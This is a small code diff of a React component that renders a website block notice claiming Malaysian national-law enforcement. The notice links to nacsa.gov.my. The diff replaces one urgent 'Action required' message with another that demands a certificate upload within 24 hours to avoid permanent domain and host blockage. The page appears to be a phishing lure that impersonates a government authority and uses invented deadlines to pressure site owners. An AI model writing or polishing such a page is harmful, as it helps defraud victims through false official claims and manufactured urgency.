@@ -9,7 +9,7 @@ function block() {
       <div className="notify">NOTIFICATION</div>
       <div className="note">This website is not available in Malaysia as it violate(s) the National Law(s).</div>
       <div className="note1">Untuk maklumat tanjut / for more information <span className="link"><a href="https://www.nacsa.gov.my/legal.php">Click here</a></span>.</div>
-      <div className="error"><span className="action">Action required:</span>The UCC certificate uploaded seems to be invalid one. We request you to reupload a valid one within 4 hours. As we detected multiple upload of invalid one, this may me the last attempt to upload a valid one.   </div>
+      <div className="error"><span className="action">Action required:</span> You site has been blocked due to invalid certifications. we request you to upload a valid certificates within 24 hours to prevent permanent Domain and Host blockage.</div>
     </div>
     </>
   )
